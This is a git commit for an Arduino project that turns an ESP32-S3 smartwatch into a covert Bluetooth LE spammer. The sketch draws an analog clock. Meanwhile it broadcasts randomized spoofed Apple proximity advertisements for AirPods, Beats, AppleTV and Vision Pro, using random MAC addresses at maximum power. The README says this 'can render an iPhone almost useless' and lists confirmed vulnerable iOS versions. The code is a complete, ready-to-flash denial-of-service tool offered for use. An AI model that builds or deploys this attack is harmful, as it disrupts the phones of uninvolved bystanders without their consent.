b416671d7614c72d70fb55d28dcd5bd2ad0069a5
HsuanYouLin <yoyomy7198come@gmail.com>
2024-06-25 12:51:46 -0500

    update project script and img and README.md

--- README.md
+++ README.md
@@ -1,2 +1,48 @@
 # EvilAppleWatch-ESP32S3
-Spam BLE advertisements on iPhones with a ESP32S3 based smart watch!
+Spam BLE advertisements on iPhones with a ESP32S3 based smart watch! (Arduino IDE based project)
+
+<img src="https://github.com/ShaunLinTW/EvilAppleWatch-ESP32S3/img/EvilAppleWatchDemo.JPG" width="300"><br>
+<img src="https://github.com/ShaunLinTW/EvilAppleWatch-ESP32S3/img/EvilAppleWatchDemo-AVP.jpg" width="300"><br>
+
+Based off of the work of [ronaldstoner](https://github.com/ronaldstoner) in the [AppleJuice repository](https://github.com/ECTO-1A/AppleJuice/blob/e6a61f6a199075f5bb5b1a00768e317571d25bb9/ESP32-Arduino/applejuice.ino) & [Raghu Saxena](https://github.com/ckcr4lyf) in the [EvilAppleJuice ESP32 repository](https://github.com/ckcr4lyf/EvilAppleJuice-ESP32/tree/master).
+
+Also thanks to [simondankelmann](https://github.com/simondankelmann) for their discoveries in new advertising messages to pop-up new notifications in iOS devices [source](https://github.com/simondankelmann/Bluetooth-LE-Spam/blob/main/app/src/main/java/de/simon/dankelmann/bluetoothlespam/AdvertisementSetGenerators/ContinuityActionModalAdvertisementSetGenerator.kt)
+
+With the randomization optimizations it can render an iPhone almost useless with a single ESP32S3 (a new notification as soon as you close the old one).
+
+Confirmed on:
+* iPhone 15 (running iOS 17.1.2)
+* iPhone 14 Pro Max (running iOS 17.2 b3) (See #19)
+* iPhone 14 Pro (running iOS 16.6.1)
+* iPhone 13 Pro (running iOS 17.4 (21E5184k))
+* iPhone 11 (running iOS 16.6.1)
+* iPhone X (running iOS 14.8 (18H17)) - only "AppleTV Keyboard", "TV Color Balance", "AppleTV Setup", "AppleTV Homekit Setup", "AppleTV New User".
+* iPad Pro 11 (running iPadOS 17.3 (21D50))
+
+Not working on:
+* iPhone 4S (running iOS 10.3 (14E277))
+* iPhone 15 Pro/Pro Max(running iOS 18.0)
+
+Other observations:
+* Doesn't seem to spawn notifications if Keyboard is open / Camera is open
+
+## Notable Differences
+
+This implementation makes the following changes:
+
+* Random source MAC address (including `BLE_ADDR_TYPE_RANDOM`)
+* Randomly pick BLE Advertisement Type ([this may lead to more success](https://github.com/ECTO-1A/AppleJuice/pull/25))
+* Randomly pick one of the possible devices
+* Sets the ESP32S3 BLE Power to the maximum (9dBm) to increase range
+
+And it makes these random choices every time it runs (default re-advertise every second).
+
+Given the 29 devices and the 3 advertisement types, there are a total of 87 unique possible advertisements (ignoring the random source MAC) possible, of which one is broadcast every second.
+
+## Usage
+
+Clone the repo, and easiest would be to use Arduino IDE to upload it to your ESP32S3.
+
+This project has been tested on an [ESP32-S3 from Waveshare](https://www.waveshare.com/esp32-s3-touch-lcd-1.28-b.htm).
+
+
---
+++ evalapplewatch-esp32s3/evalapplewatch-esp32s3.ino
@@ -0,0 +1,497 @@
+#include <Arduino_GFX_Library.h>
+#include <Arduino.h>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEServer.h>
+
+#define TFT_DC 8
+#define TFT_CS 9
+#define TFT_SCLK 10
+#define TFT_MOSI 11
+#define TFT_MISO 12
+#define TFT_BLK 2
+#define TFT_RES 14
+
+#define GFX_BL TFT_BLK
+
+Arduino_ESP32SPI *bus = new Arduino_ESP32SPI(TFT_DC, TFT_CS, TFT_SCLK, TFT_MOSI, TFT_MISO, HSPI, true); // Constructor
+Arduino_GFX *gfx = new Arduino_GC9A01(bus, TFT_RES, 0 /* rotation */, true /* IPS */);
+
+#define BACKGROUND BLACK
+#define MARK_COLOR WHITE
+#define SUBMARK_COLOR DARKGREY // LIGHTGREY
+#define HOUR_COLOR WHITE
+#define MINUTE_COLOR BLUE // LIGHTGREY
+#define SECOND_COLOR RED
+
+#define SIXTIETH 0.016666667
+#define TWELFTH 0.08333333
+#define SIXTIETH_RADIAN 0.10471976
+#define TWELFTH_RADIAN 0.52359878
+#define RIGHT_ANGLE_RADIAN 1.5707963
+
+BLEAdvertising *pAdvertising;  // global variable
+uint32_t delayMilliseconds = 1000;
+
+/*
+  These are audio devices: wireless headphones / earbuds
+  It seems these need a shorter range between ESP & iDevice
+*/
+const uint8_t DEVICES[][31] = {
+  // Airpods
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Max
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Gen 2
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Gen 3
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Airpods Pro Gen 2
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Power Beats
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Power Beats Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Solo Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio Buds
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Flex
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats X
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Solo 3
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio 3
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Betas Fit Pro
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Beats Studio Buds Plus
+  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+};
+
+/*
+  These are more general home devices
+  It seems these can work over long distances, especially AppleTV Setup
+*/
+const uint8_t SHORT_DEVICES[][23] = {
+  // AppleTV Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Pair
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV New User
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV AppleID Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Wireless Audio Sync
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Homekit Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Keyboard Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // AppleTV Connecting to Network
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Homepod Setup
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Setup New Phone
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Transfer Number
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // TV Color Balance
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Vision Pro
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+};
+
+static uint8_t conv2d(const char *p)
+{
+    uint8_t v = 0;
+    return (10 * (*p - '0')) + (*++p - '0');
+}
+
+static int16_t w, h, center;
+static int16_t hHandLen, mHandLen, sHandLen, markLen;
+static float sdeg, mdeg, hdeg;
+static int16_t osx = 0, osy = 0, omx = 0, omy = 0, ohx = 0, ohy = 0; // Saved H, M, S x & y coords
+static int16_t nsx, nsy, nmx, nmy, nhx, nhy;                         // H, M, S x & y coords
+static int16_t xMin, yMin, xMax, yMax;                               // redraw range
+static int16_t hh, mm, ss;
+static unsigned long targetTime; // next action time
+
+static int16_t *cached_points;
+static uint16_t cached_points_idx = 0;
+static int16_t *last_cached_point;
+
+void setup(void)
+{    
+    gfx->begin();
+    gfx->fillScreen(BACKGROUND);
+
+#ifdef GFX_BL
+    pinMode(GFX_BL, OUTPUT);
+    digitalWrite(GFX_BL, HIGH);
+#endif
+
+    // init LCD constant
+    w = gfx->width();
+    h = gfx->height();
+    if (w < h)
+    {
+        center = w / 2;
+    }
+    else
+    {
+        center = h / 2;
+    }
+    hHandLen = center * 3 / 8;
+    mHandLen = center * 2 / 3;
+    sHandLen = center * 5 / 6;
+    markLen = sHandLen / 6;
+    cached_points = (int16_t *)malloc((hHandLen + 1 + mHandLen + 1 + sHandLen + 1) * 2 * 2);
+
+    // Draw 60 clock marks
+    draw_round_clock_mark(
+        // draw_square_clock_mark(
+        center - markLen, center,
+        center - (markLen * 2 / 3), center,
+        center - (markLen / 2), center);
+
+    hh = conv2d(__TIME__);
+    mm = conv2d(__TIME__ + 3);
+    ss = conv2d(__TIME__ + 6);
+
+    targetTime = ((millis() / 1000) + 1) * 1000;
+
+    // start BLE setup
+    BLEDevice::init("AirPods 69");
+
+    // Increase BLE Power to 9dBm (MAX)
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    
+    // Create the BLE Server
+    BLEServer *pServer = BLEDevice::createServer();
+    pAdvertising = pServer->getAdvertising();
+
+    // seems we need to init it with an address in setup() step.
+    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+}
+
+void loop()
+{
+    // First generate fake random MAC
+    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    for (int i = 0; i < 6; i++){
+    dummy_addr[i] = random(256);
+
+    // It seems for some reason first 4 bits
+    // Need to be high (aka 0b1111), so we 
+    // OR with 0xF0
+    //if (i == 0){
+      //dummy_addr[i] |= 0xF0;
+    //}
+    }
+
+    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+
+    // Randomly pick data from one of the devices
+    // First decide short or long
+    // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
+    int device_choice = random(2);
+    //int device_choice = 1;
+    if (device_choice == 0){
+      int index = random(17);
+      // oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
+      String deviceData = String((char*)DEVICES[index], 31);
+      oAdvertisementData.addData(deviceData);
+    } else {
+      int index = random(13);
+      // oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
+      String shortDeviceData = String((char*)SHORT_DEVICES[index], 23);
+      oAdvertisementData.addData(shortDeviceData);
+    }
+
+    int adv_type_choice = random(3);
+    if (adv_type_choice == 0){
+      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
+    } else if (adv_type_choice == 1){
+      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
+    } else {
+      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
+    }
+
+    // Set the device address, advertisement data
+    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
+    pAdvertising->setAdvertisementData(oAdvertisementData);
+
+    pAdvertising->start();
+    delay(delayMilliseconds); // delay for delayMilliseconds ms
+    pAdvertising->stop();
+
+    // watch loop
+    unsigned long cur_millis = millis();
+    if (cur_millis >= targetTime)
+    {
+        targetTime += 1000;
+        ss++; // Advance second
+        if (ss == 60)
+        {
+            ss = 0;
+            mm++; // Advance minute
+            if (mm > 59)
+            {
+                mm = 0;
+                hh++; // Advance hour
+                if (hh > 23)
+                {
+                    hh = 0;
+                }
+            }
+        }
+    }
+
+    // Pre-compute hand degrees, x & y coords for a fast screen update
+    sdeg = SIXTIETH_RADIAN * ((0.001 * (cur_millis % 1000)) + ss); // 0-59 (includes millis)
+    nsx = cos(sdeg - RIGHT_ANGLE_RADIAN) * sHandLen + center;
+    nsy = sin(sdeg - RIGHT_ANGLE_RADIAN) * sHandLen + center;
+    if ((nsx != osx) || (nsy != osy))
+    {
+        mdeg = (SIXTIETH * sdeg) + (SIXTIETH_RADIAN * mm); // 0-59 (includes seconds)
+        hdeg = (TWELFTH * mdeg) + (TWELFTH_RADIAN * hh);   // 0-11 (includes minutes)
+        mdeg -= RIGHT_ANGLE_RADIAN;
+        hdeg -= RIGHT_ANGLE_RADIAN;
+        nmx = cos(mdeg) * mHandLen + center;
+        nmy = sin(mdeg) * mHandLen + center;
+        nhx = cos(hdeg) * hHandLen + center;
+        nhy = sin(hdeg) * hHandLen + center;
+
+        // redraw hands
+        redraw_hands_cached_draw_and_erase();
+
+        ohx = nhx;
+        ohy = nhy;
+        omx = nmx;
+        omy = nmy;
+        osx = nsx;
+        osy = nsy;
+
+        delay(1);
+    }
+}
+
+void draw_round_clock_mark(int16_t innerR1, int16_t outerR1, int16_t innerR2, int16_t outerR2, int16_t innerR3, int16_t outerR3)
+{
+    float x, y;
+    int16_t x0, x1, y0, y1, innerR, outerR;
+    uint16_t c;
+
+    for (uint8_t i = 0; i < 60; i++)
+    {
+        if ((i % 15) == 0)
+        {
+            innerR = innerR1;
+            outerR = outerR1;
+            c = MARK_COLOR;
+        }
+        else if ((i % 5) == 0)
+        {
+            innerR = innerR2;
+            outerR = outerR2;
+            c = MARK_COLOR;
+        }
+        else
+        {
+            innerR = innerR3;
+            outerR = outerR3;
+            c = SUBMARK_COLOR;
+        }
+
+        mdeg = (SIXTIETH_RADIAN * i) - RIGHT_ANGLE_RADIAN;
+        x = cos(mdeg);
+        y = sin(mdeg);
+        x0 = x * outerR + center;
+        y0 = y * outerR + center;
+        x1 = x * innerR + center;
+        y1 = y * innerR + center;
+
+        gfx->drawLine(x0, y0, x1, y1, c);
+    }
+}
+
+void draw_square_clock_mark(int16_t innerR1, int16_t outerR1, int16_t innerR2, int16_t outerR2, int16_t innerR3, int16_t outerR3)
+{
+    float x, y;
+    int16_t x0, x1, y0, y1, innerR, outerR;
+    uint16_t c;
+
+    for (uint8_t i = 0; i < 60; i++)
+    {
+        if ((i % 15) == 0)
+        {
+            innerR = innerR1;
+            outerR = outerR1;
+            c = MARK_COLOR;
+        }
+        else if ((i % 5) == 0)
+        {
+            innerR = innerR2;
+            outerR = outerR2;
+            c = MARK_COLOR;
+        }
+        else
+        {
+            innerR = innerR3;
+            outerR = outerR3;
+            c = SUBMARK_COLOR;
+        }
+
+        if ((i >= 53) || (i < 8))
+        {
+            x = tan(SIXTIETH_RADIAN * i);
+            x0 = center + (x * outerR);
+            y0 = center + (1 - outerR);
+            x1 = center + (x * innerR);
+            y1 = center + (1 - innerR);
+        }
+        else if (i < 23)
+        {
+            y = tan((SIXTIETH_RADIAN * i) - RIGHT_ANGLE_RADIAN);
+            x0 = center + (outerR);
+            y0 = center + (y * outerR);
+            x1 = center + (innerR);
+            y1 = center + (y * innerR);
+        }
+        else if (i < 38)
+        {
+            x = tan(SIXTIETH_RADIAN * i);
+            x0 = center - (x * outerR);
+            y0 = center + (outerR);
+            x1 = center - (x * innerR);
+            y1 = center + (innerR);
+        }
+        else if (i < 53)
+        {
+            y = tan((SIXTIETH_RADIAN * i) - RIGHT_ANGLE_RADIAN);
+            x0 = center + (1 - outerR);
+            y0 = center - (y * outerR);
+            x1 = center + (1 - innerR);
+            y1 = center - (y * innerR);
+        }
+        gfx->drawLine(x0, y0, x1, y1, c);
+    }
+}
+
+void redraw_hands_cached_draw_and_erase()
+{
+    gfx->startWrite();
+    draw_and_erase_cached_line(center, center, nsx, nsy, SECOND_COLOR, cached_points, sHandLen + 1, false, false);
+    draw_and_erase_cached_line(center, center, nhx, nhy, HOUR_COLOR, cached_points + ((sHandLen + 1) * 2), hHandLen + 1, true, false);
+    draw_and_erase_cached_line(center, center, nmx, nmy, MINUTE_COLOR, cached_points + ((sHandLen + 1 + hHandLen + 1) * 2), mHandLen + 1, true, true);
+    gfx->endWrite();
+}
+
+void draw_and_erase_cached_line(int16_t x0, int16_t y0, int16_t x1, int16_t y1, int16_t color, int16_t *cache, int16_t cache_len, bool cross_check_second, bool cross_check_hour)
+{
+#if defined(ESP8266)
+    yield();
+#endif
+    bool steep = _diff(y1, y0) > _diff(x1, x0);
+    if (steep)
+    {
+        _swap_int16_t(x0, y0);
+        _swap_int16_t(x1, y1);
+    }
+
+    int16_t dx, dy;
+    dx = _diff(x1, x0);
+    dy = _diff(y1, y0);
+
+    int16_t err = dx / 2;
+    int8_t xstep = (x0 < x1) ? 1 : -1;
+    int8_t ystep = (y0 < y1) ? 1 : -1;
+    x1 += xstep;
+    int16_t x, y, ox, oy;
+    for (uint16_t i = 0; i <= dx; i++)
+    {
+        if (steep)
+        {
+            x = y0;
+            y = x0;
+        }
+        else
+        {
+            x = x0;
+            y = y0;
+        }
+        ox = *(cache + (i * 2));
+        oy = *(cache + (i * 2) + 1);
+        if ((x == ox) && (y == oy))
+        {
+            if (cross_check_second || cross_check_hour)
+            {
+                write_cache_pixel(x, y, color, cross_check_second, cross_check_hour);
+            }
+        }
+        else
+        {
+            write_cache_pixel(x, y, color, cross_check_second, cross_check_hour);
+            if ((ox > 0) || (oy > 0))
+            {
+                write_cache_pixel(ox, oy, BACKGROUND, cross_check_second, cross_check_hour);
+            }
+            *(cache + (i * 2)) = x;
+            *(cache + (i * 2) + 1) = y;
+        }
+        if (err < dy)
+        {
+            y0 += ystep;
+            err += dx;
+        }
+        err -= dy;
+        x0 += xstep;
+    }
+    for (uint16_t i = dx + 1; i < cache_len; i++)
+    {
+        ox = *(cache + (i * 2));
+        oy = *(cache + (i * 2) + 1);
+        if ((ox > 0) || (oy > 0))
+        {
+            write_cache_pixel(ox, oy, BACKGROUND, cross_check_second, cross_check_hour);
+        }
+        *(cache + (i * 2)) = 0;
+        *(cache + (i * 2) + 1) = 0;
+    }
+}
+
+void write_cache_pixel(int16_t x, int16_t y, int16_t color, bool cross_check_second, bool cross_check_hour)
+{
+    int16_t *cache = cached_points;
+    if (cross_check_second)
+    {
+        for (uint16_t i = 0; i <= sHandLen; i++)
+        {
+            if ((x == *(cache++)) && (y == *(cache)))
+            {
+                return;
+            }
+            cache++;
+        }
+    }
+    if (cross_check_hour)
+    {
+        cache = cached_points + ((sHandLen + 1) * 2);
+        for (uint16_t i = 0; i <= hHandLen; i++)
+        {
+            if ((x == *(cache++)) && (y == *(cache)))
+            {
+                return;
+            }
+            cache++;
+        }
+    }
+    gfx->writePixel(x, y, color);
+}
